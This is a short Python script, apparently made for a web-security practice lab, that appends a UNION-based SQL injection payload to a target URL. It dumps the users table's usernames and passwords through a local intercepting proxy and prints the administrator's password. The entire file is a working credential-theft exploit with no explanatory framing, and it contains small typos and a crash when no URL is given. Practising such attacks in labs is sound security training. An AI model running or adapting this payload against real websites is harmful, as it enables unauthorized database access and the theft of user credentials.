import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli_users_tables(url):
    username = 'administrator'
    sql_payload = "'union select null, username||'-'||password from users --"
    r = requests.get(url + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administartor password....")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(text=re.compile('.*administrator.*')).split("-")[1]
        print("[+] The administrator password is '%s'" % admin_password)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usages: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com/filter?category=pets" % sys.argv[0])

    print("[+] Dumping the list of username and passowrds.....")

    if not exploit_sqli_users_tables(url):
        print("[-] Did not find an administrator password.")